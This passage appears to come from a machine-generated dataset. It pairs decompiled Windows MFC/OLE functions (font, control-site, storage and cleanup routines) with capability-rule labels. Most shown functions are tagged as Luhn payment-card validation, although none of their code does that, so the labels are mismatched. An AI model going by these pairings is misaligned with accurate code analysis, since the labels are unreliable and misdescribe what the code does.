        "decompiled_code": "\nuint __cdecl fcn.00403e73(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.00403cda();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(arg_ch + 10, \"DISPLAY\");\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x44d1b8)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 416
    },
    "00404a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n\nvoid __cdecl fcn.00404a54(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint32_t var_94h;\n    uint uStack148;\n    uint uStack144;\n    int32_t lpvObject;\n    uint var_78h;\n    uint var_71h;\n    uint lpMultiByteStr;\n    uint lpFontDesc;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint hdc;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = 0x42adbc;\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    if ((iVar2 == 0) || (*(iVar2 + 4) == 0)) {\n        lpvObject = 0x11;\n        uStack144 = 0x404a8e;\n        iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)();\n        *(unaff_EBP + -0x14) = iVar2;\n        if (iVar2 == 0) {\n            lpvObject = 0xd;\n            uStack144 = 0x404a99;\n            iVar2 = (*pcVar1)();\n            *(unaff_EBP + -0x14) = iVar2;\n            if (iVar2 == 0) {\n                *(extraout_ECX + 0x44) = 0;\n                *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n                *(unaff_EBP + -4) = 1;\n                goto code_r0x00404bae;\n            }\n        }\n        iVar2 = unaff_EBP + -0x18;\n    }\n    lpvObject = unaff_EBP + -0x88;\n    uStack144 = 0x3c;\n    uStack148 = *(iVar2 + 4);\n    var_94h = 0x404acb;\n    (*_sym.imp.GDI32.dll_GetObjectA)();\n    *(unaff_EBP + -0x4c) = 0x20;\n    if (unaff_EBP == 0x6c) {\n        *0x24 = 0;\n        iVar2 = extraout_ECX;\n    }\n    else {\n        var_94h = unaff_EBP - 0x6c;\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        fcn.0040b610();\n        var_94h = var_94h & 0xffff0000;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                  (0, 0, unaff_EBP + -0x6c, 0xffffffff, &fcn.00404a54::var_94h, iVar2 + 1);\n        iVar2 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x48) = &fcn.00404a54::var_94h;\n    }\n    *(unaff_EBP + -0x3c) = *(unaff_EBP + -0x78);\n    *(unaff_EBP + -0x3a) = *(unaff_EBP + -0x71);\n    *(unaff_EBP + -0x38) = *(unaff_EBP + -0x74);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + -0x73);\n    *(unaff_EBP + -0x30) = *(unaff_EBP + -0x72);\n    iVar3 = *(unaff_EBP + -0x88);\n    if (iVar3 < 0) {\n        iVar3 = -iVar3;\n    }\n    var_94h = *(iVar2 + 0x1c);\n    fcn.00422212(var_94h);\n    *(unaff_EBP + -4) = 2;\n    iVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(*(unaff_EBP + -0x24), 0x5a);\n    puVar5 = iVar2 + 0x44;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x44) = (iVar3 * 720000) / iVar4;\n    fcn.00425322(puVar5);\n    iVar2 = (*_sym.imp.OLEPRO32.DLL_OleCreateFontIndirect)(unaff_EBP + -0x4c, 0x42c2f8, puVar5);\n    if (iVar2 < 0) {\n        *puVar5 = 0;\n    }\n    *(unaff_EBP + -4) = 0;\n    lpvObject = 0x404ba0;\n    fcn.00422284();\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\ncode_r0x00404bae:\n    lpvObject = 0x404bb6;\n    fcn.00422430();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1331
    },
    "00404fe6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00404fe6(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t **ppiVar2;\n    int32_t unaff_EBP;\n    code *pcVar3;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumUnknown.0;\n    pcVar3 = NULL;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) && (ppiVar2 = extraout_ECX[9],  extraout_ECX[0xb] != NULL)) {\n        do {\n            (**(**ppiVar2 + 8))(*ppiVar2);\n            pcVar3 = pcVar3 + 1;\n            ppiVar2 = ppiVar2 + 1;\n        } while (pcVar3 < extraout_ECX[0xb]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00425799();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 342
    },
    "004051df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.004051df(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041c2ea();\n    pcVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[7] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    fcn.004266fb();\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x19] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = *0x449654;\n    extraout_ECX[0x28] = NULL;\n    extraout_ECX[0x29] = NULL;\n    extraout_ECX[0x2e] = vtable.COleControlSite::XOleClientSite.0;\n    extraout_ECX[0x2f] = vtable.COleControlSite::XOleIPSite.0;\n    extraout_ECX[0x30] = vtable.COleControlSite::XOleControlSite.0;\n    extraout_ECX[0x31] = vtable.COleControlSite::XAmbientProps.0;\n    extraout_ECX[0x32] = vtable.COleControlSite::XPropertyNotifySink.0;\n    extraout_ECX[0x33] = vtable.COleControlSite::XEventSink.0;\n    extraout_ECX[0x34] = vtable.COleControlSite::XBoundObjectSite.0;\n    extraout_ECX[0x35] = vtable.COleControlSite::XNotifyDBEvents.0;\n    extraout_ECX[0x36] = vtable.COleControlSite::XRowsetNotify.0;\n    *extraout_ECX = vtable.COleControlSite.0;\n    fcn.0040b990(extraout_ECX + 0x2a, 0, 0x10);\n    uVar2 = *(unaff_EBP + -0xc);\n    *(extraout_ECX + 0x2a) = 0;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 755
    },
    "0040542e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nbool fcn.0040542e(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = *(extraout_ECX + 0x38);\n    iVar2 = *(extraout_ECX + 0x30);\n    *(unaff_EBP + -0x14) = *(extraout_ECX + 0x34) - *(extraout_ECX + 0x2c);\n    *(unaff_EBP + -0x10) = iVar1 - iVar2;\n    fcn.0042215e(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.00423483(unaff_EBP + -0x14);\n    iVar1 = (**(**(extraout_ECX + 0x4c) + 0x44))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n    if (-1 < iVar1) {\n        iVar2 = (**(**(extraout_ECX + 0x4c) + 0x48))(*(extraout_ECX + 0x4c), 1, unaff_EBP + -0x14);\n        if (-1 < iVar2) {\n            fcn.00423511(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x34) = *(unaff_EBP + -0x14) + *(extraout_ECX + 0x2c);\n            *(extraout_ECX + 0x38) = *(extraout_ECX + 0x30) + *(unaff_EBP + -0x10);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004221d0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return -1 < iVar1;\n}\n",
        "token_count": 499
    },
    "004059d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_70h\n\nint32_t __cdecl fcn.004059d0(uint arg_8h, uint arg_ch, uint hMem, uint arg_14h)\n\n{\n    int32_t **arg_18h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_70h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    arg_18h = extraout_ECX + 0x13;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    iVar1 = fcn.004057a2(*(unaff_EBP + 8), 0, 3, 0x42c488, arg_18h, *(unaff_EBP + 0x14));\n    *(unaff_EBP + 0x14) = iVar1;\n    if (iVar1 < 0) goto code_r0x00405cc9;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + 8) = 0;\n    fcn.00405e49(extraout_ECX + 0xf);\n    iVar1 = (**(*extraout_ECX + 0xbc))();\n    *(unaff_EBP + -0x20) = iVar1;\n    if (iVar1 == 0) {\n        (**(**arg_18h + 0x58))(*arg_18h, 1, extraout_ECX + 0x1c);\n        if ((*(extraout_ECX + 0x72) & 2) == 0) goto code_r0x00405a5c;\n        iVar1 = (**(**arg_18h + 0xc))(*arg_18h, extraout_ECX + 0x2e);\n        *(unaff_EBP + 0x14) = iVar1;\n        if (-1 < iVar1) goto code_r0x00405a5c;\ncode_r0x00405c90:\n        piVar3 = *arg_18h;\n        if (piVar3 != NULL) {\n            (**(*piVar3 + 0x18))(piVar3, 1);\n            (**(**arg_18h + 8))(*arg_18h);\n            *arg_18h = NULL;\n        }\n    }\n    else {\ncode_r0x00405a5c:\n        piVar3 = *(unaff_EBP + 0xc);\n        if (piVar3 == NULL) {\n            if (*(unaff_EBP + 0x10) == 0) goto code_r0x00405acb;\ncode_r0x00405b35:\n            iVar1 = (****arg_18h)(*arg_18h, 0x42c458, unaff_EBP + -0x14);\n            if (-1 < iVar1) {\n                if (piVar3 == NULL) {\n                    *(unaff_EBP + 0xc) = 0;\n                    iVar1 = (*_sym.imp.ole32.dll_CreateILockBytesOnHGlobal)(0, 1, unaff_EBP + 0xc);\n                    *(unaff_EBP + 0x14) = iVar1;\n                    if (-1 < iVar1) {\n                        *(unaff_EBP + 0x10) = 0;\n                        iVar1 = (*_sym.imp.ole32.dll_StgCreateDocfileOnILockBytes)\n                                          (*(unaff_EBP + 0xc), 0x1012, 0, unaff_EBP + 0x10);\n                        *(unaff_EBP + 0x14) = iVar1;\n                        if (-1 < iVar1) {\n                            uVar2 = (**(**(unaff_EBP + -0x14) + 0x14))(*(unaff_EBP + -0x14), *(unaff_EBP + 0x10));\n                            *(unaff_EBP + 0x14) = uVar2;\n                            (**(**(unaff_EBP + 0x10) + 8))(*(unaff_EBP + 0x10));\n                        }\n                        piVar3 = *(unaff_EBP + 0xc);\ncode_r0x00405ba4:\n                        (**(*piVar3 + 8))(piVar3);\n                    }\n                }\n                else {\n                    if (*(unaff_EBP + 0x10) == 0) {\n                        *(unaff_EBP + 0x14) = 0x8000ffff;\n                        goto code_r0x00405c5d;\n                    }\n                    uVar2 = (**(*piVar3 + 0x30))();\n                    *(unaff_EBP + 0xc) = uVar2;\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, uVar2);\n                    *(unaff_EBP + 0x10) = iVar1;\n                    if (iVar1 == 0) {\ncode_r0x00405bf2:\n                        *(unaff_EBP + 0x14) = 0x8007000e;\n                        *(unaff_EBP + 0x10) = 0;\n                    }\n                    else {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n                        if (iVar1 == 0) goto code_r0x00405bf2;\n                        (**(*piVar3 + 0x34))(iVar1, *(unaff_EBP + 0xc));\n                        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + 0x10));\n                    }\n                    *(unaff_EBP + -0x1c) = 0;\n                    if (*(unaff_EBP + 0x10) != 0) {\n                        iVar1 = (*_sym.imp.ole32.dll_CreateILockBytesOnHGlobal)\n                                          (*(unaff_EBP + 0x10), 1, unaff_EBP + -0x1c);\n                        *(unaff_EBP + 0x14) = iVar1;\n                        if (-1 < iVar1) {\n                            *(unaff_EBP + -0x18) = 0;\n                            iVar1 = (*_sym.imp.ole32.dll_StgOpenStorageOnILockBytes)\n                                              (*(unaff_EBP + -0x1c), 0, 0x12, 0, 0, unaff_EBP + -0x18);\n                            *(unaff_EBP + 0x14) = iVar1;\n                            if (-1 < iVar1) {\n                                uVar2 = (**(**(unaff_EBP + -0x14) + 0x18))(*(unaff_EBP + -0x14), *(unaff_EBP + -0x18));\n                                *(unaff_EBP + 0x14) = uVar2;\n                                (**(**(unaff_EBP + -0x18) + 8))(*(unaff_EBP + -0x18));\n                            }\n                            piVar3 = *(unaff_EBP + -0x1c);\n                            goto code_r0x00405ba4;\n                        }\n                    }\n                }\ncode_r0x00405c5d:\n                piVar3 = *(unaff_EBP + -0x14);\ncode_r0x00405c60:\n                (**(*piVar3 + 8))(piVar3);\n                goto code_r0x00405c66;\n            }\n        }\n        else {\n            if (*(unaff_EBP + 0x10) != 0) goto code_r0x00405b35;\n            iVar1 = (****arg_18h)(*arg_18h, 0x42c478, unaff_EBP + 8);\n            if (iVar1 < 0) {\ncode_r0x00405acb:\n                iVar1 = (****arg_18h)(*arg_18h, 0x42c468, unaff_EBP + -0x10);\n                if (iVar1 < 0) goto code_r0x00405b35;\n                if (piVar3 == NULL) {\n                    uVar2 = (**(**(unaff_EBP + -0x10) + 0x20))(*(unaff_EBP + -0x10));\n                    *(unaff_EBP + 0x14) = uVar2;\n                }\n                else {\n                    fcn.00422642(piVar3, 1, 0x1000, 0);\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0041b4a8(unaff_EBP + -0x70);\n                    uVar2 = (**(**(unaff_EBP + -0x10) + 0x14))(*(unaff_EBP + -0x10), unaff_EBP + -0x2c);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(unaff_EBP + 0x14) = uVar2;\n                    fcn.0042271e();\n                }\n                piVar3 = *(unaff_EBP + -0x10);\n                goto code_r0x00405c60;\n            }\n            iVar1 = (**(*piVar3 + 0x50))(3, 0, 0, 0);\n            if (iVar1 == 0) goto code_r0x00405acb;\n            iVar1 = *piVar3;\n            *(unaff_EBP + 0x10) = 0;\n            uVar2 = (**(iVar1 + 0x50))(0, 0xffffffff, unaff_EBP + 0x10, unaff_EBP + 0xc);\n            uVar2 = (**(**(unaff_EBP + 8) + 0x14))(*(unaff_EBP + 8), *(unaff_EBP + 0x10), uVar2);\n            *(unaff_EBP + 0x14) = uVar2;\n            (**(**(unaff_EBP + 8) + 8))(*(unaff_EBP + 8));\n            *(unaff_EBP + 8) = 0;\ncode_r0x00405c66:\n            if (*(unaff_EBP + 0x14) < 0) goto code_r0x00405c90;\n            if ((*(unaff_EBP + -0x20) == 0) && ((*(*(unaff_EBP + -0x24) + 0x72) & 2) == 0)) {\n                uVar2 = (**(**arg_18h + 0xc))(*arg_18h, *(unaff_EBP + -0x24) + 0xb8);\n                *(unaff_EBP + 0x14) = uVar2;\n            }\n        }\n        if (*(unaff_EBP + 0x14) < 0) goto code_r0x00405c90;\n    }\n    piVar3 = *(unaff_EBP + 8);\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    if ((*(unaff_EBP + -0x20) != 0) && (-1 < *(unaff_EBP + 0x14))) {\n        *(unaff_EBP + 0x14) = 1;\n    }\n    iVar1 = *(unaff_EBP + 0x14);\ncode_r0x00405cc9:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 2614
    },
    "00405fc3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fc3(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *var_4h;\n    \n    puVar1 = param_1 + 0x74;\n    var_4h = param_1;\n    fcn.0040b990(puVar1, 0, 0x10);\n    var_4h = NULL;\n    *puVar1 = 0x10;\n    iVar2 = (****(param_1 + 0x4c))(*(param_1 + 0x4c), 0x42c498, &var_4h);\n    if (-1 < iVar2) {\n        (**(*var_4h + 0xc))(var_4h, puVar1);\n        (**(*var_4h + 8))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "004071b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004071b8(void)\n\n{\n    code *pcVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    code **extraout_ECX;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    *extraout_ECX = vtable.CDataSourceControl.0;\n    iVar7 = 0;\n    pcVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if (((pcVar1 != NULL) && (extraout_ECX[0x14] != NULL)) &&\n       (puVar6 = *extraout_ECX[0x14],  iVar5 = (***puVar6)(puVar6, 0x42c4a8, unaff_EBP + -0x18),  -1 < iVar5)) {\n        *(unaff_EBP + -0x10) = 0;\n        iVar5 = (**(**(unaff_EBP + -0x18) + 0x10))(*(unaff_EBP + -0x18), 0x42c368, unaff_EBP + -0x10);\n        if (-1 < iVar5) {\n            (**(**(unaff_EBP + -0x10) + 0x18))(*(unaff_EBP + -0x10), extraout_ECX[0x16]);\n            (**(**(unaff_EBP + -0x10) + 8))(*(unaff_EBP + -0x10));\n        }\n        (**(**(unaff_EBP + -0x18) + 8))(*(unaff_EBP + -0x18));\n    }\n    while (extraout_ECX[9] != NULL) {\n        ppiVar2 = *(extraout_ECX[7] + 8);\n        (**(**ppiVar2 + 0xb8))(ppiVar2[2], 0);\n        (*ppiVar2)[0x24] = 0;\n    }\n    *(unaff_EBP + -0x1c) = extraout_ECX + 6;\n    fcn.0041b699();\n    if (extraout_ECX[0x10] != NULL) {\n        iVar5 = 0;\n        pcVar1 = extraout_ECX[0xe];\n        if (0 < pcVar1) {\n            do {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX[0x10] + iVar7);\n                iVar5 = iVar5 + 1;\n                iVar7 = iVar7 + 0x10;\n            } while (iVar5 < extraout_ECX[0xe]);\n            pcVar1 = extraout_ECX[0xe];\n        }\n        if (pcVar1 != NULL) {\n            fcn.0041bd2d(extraout_ECX[0xf]);\n            fcn.0041bd2d(extraout_ECX[0x10]);\n        }\n    }\n    piVar3 = extraout_ECX[2];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    piVar3 = extraout_ECX[3];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    if (extraout_ECX[5] != NULL) {\n        pcVar1 = extraout_ECX[4];\n        *(unaff_EBP + -0x14) = 0;\n        if (0 < pcVar1) {\n            iVar7 = 0;\n            do {\n                puVar6 = *(*(extraout_ECX[5] + iVar7 + 0x24) + 4);\n                while (puVar6 != NULL) {\n                    puVar4 = *puVar6;\n                    *(puVar6[2] + 0x90) = 0;\n                    puVar6 = puVar4;\n                }\n                fcn.0041b699();\n                if (*(extraout_ECX[5] + iVar7 + 0x24) != NULL) {\n                    (**(**(extraout_ECX[5] + iVar7 + 0x24) + 4))(1);\n                }\n                *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n                iVar7 = iVar7 + 0x28;\n            } while (*(unaff_EBP + -0x14) < extraout_ECX[4]);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[5]);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[0xd]);\n    }\n    if (extraout_ECX[0x15] != NULL) {\n        fcn.00407398(*extraout_ECX[0x14]);\n        fcn.004074b9();\n    }\n    pcVar1 = extraout_ECX[0x15];\n    if (pcVar1 != NULL) {\n        fcn.004074b9();\n        fcn.0041bd2d(pcVar1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if (pcVar1 != NULL) {\n        fcn.0040741f();\n        fcn.0041bd2d(pcVar1);\n    }\n    piVar3 = extraout_ECX[0x13];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    piVar3 = extraout_ECX[0x12];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041b6b9();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1484
    },
    "004076fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a4h\n\nint32_t fcn.004076fe(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint pv;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar3 = extraout_ECX[0x12];\n    *(unaff_EBP + -0x28) = extraout_ECX[5];\n    *(unaff_EBP + -0x2c) = extraout_ECX[4];\n    if (iVar3 == 0) {\n        piVar1 = extraout_ECX[2];\n        if (piVar1 == NULL) {\n            iVar3 = 0;\n            goto code_r0x00407a0f;\n        }\n        iVar3 = (**(*piVar1 + 0xc))(piVar1, 0x42c518, unaff_EBP + -0x1c, unaff_EBP + -0x24);\n        if (iVar3 < 0) goto code_r0x00407a0f;\n        fcn.00407f2d(unaff_EBP + -0xa4, 0x42c5e8);\n        *(unaff_EBP + -0x84) = 0xffffffff;\n        *(unaff_EBP + -0x8c) = 0;\n        *(unaff_EBP + -0x88) = 0;\n        *(unaff_EBP + -0x80) = 0x18;\n        *(unaff_EBP + -0x7c) = 0;\n        *(unaff_EBP + -0x78) = 0x1fb;\n        fcn.00407f2d(unaff_EBP + -0x74, 0x42c6c0);\n        *(unaff_EBP + -0x54) = 0xffffffff;\n        *(unaff_EBP + -0x5c) = 0x1c;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x50) = 0x20;\n        *(unaff_EBP + -0x4c) = 0;\n        *(unaff_EBP + -0x48) = 0x1e;\n        iVar3 = (**(**(unaff_EBP + -0x1c) + 0x10))(*(unaff_EBP + -0x1c), 2, unaff_EBP + -0xa4, 0x28, 0);\n        if (iVar3 < 0) {\n            (**(**(unaff_EBP + -0x1c) + 8))(*(unaff_EBP + -0x1c));\n            goto code_r0x00407a0f;\n        }\n        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x24);\n        *(unaff_EBP + -0x40) = 1;\n        *(unaff_EBP + -0x3c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        iVar3 = (**(**(unaff_EBP + -0x1c) + 0x18))(*(unaff_EBP + -0x1c), 0, 0, unaff_EBP + -0x44);\n        *(unaff_EBP + -0x20) = iVar3;\n        if (-1 < iVar3) {\n            iVar3 = *(unaff_EBP + -0x38);\n            extraout_ECX[5] = *(unaff_EBP + -0x3c);\n            *(unaff_EBP + -0x24) = *(unaff_EBP + -0x30);\n            extraout_ECX[4] = *(unaff_EBP + -0x30);\n            piVar1 = *(unaff_EBP + -0x1c);\n            extraout_ECX[0xd] = iVar3;\n            (**(*piVar1 + 8))(piVar1);\n            goto code_r0x00407965;\n        }\n        (**(**(unaff_EBP + -0x1c) + 8))(*(unaff_EBP + -0x1c));\n    }\n    else {\n        iVar3 = (**(*extraout_ECX[0x13] + 0x14))(extraout_ECX[0x13], 0x42c388, unaff_EBP + -0x14);\n        *(unaff_EBP + -0x20) = iVar3;\n        if (iVar3 < 0) goto code_r0x00407a0f;\n        iVar3 = (****(unaff_EBP + -0x14))(*(unaff_EBP + -0x14), 0x42c4a8, unaff_EBP + -0x18);\n        if (-1 < iVar3) {\n            *(unaff_EBP + -0x10) = 0;\n            iVar3 = (**(**(unaff_EBP + -0x18) + 0x10))(*(unaff_EBP + -0x18), 0x42c368, unaff_EBP + -0x10);\n            if (-1 < iVar3) {\n                (**(**(unaff_EBP + -0x10) + 0x14))(*(unaff_EBP + -0x10), extraout_ECX[1] + 0xd8, extraout_ECX + 0x16);\n                (**(**(unaff_EBP + -0x10) + 8))(*(unaff_EBP + -0x10));\n            }\n            (**(**(unaff_EBP + -0x18) + 8))(*(unaff_EBP + -0x18));\n        }\n        iVar3 = fcn.0041bd04(0x10);\n        *(unaff_EBP + -0x24) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00407a1e(*(unaff_EBP + -0x14));\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        extraout_ECX[0x14] = iVar3;\n        (**(**(unaff_EBP + -0x14) + 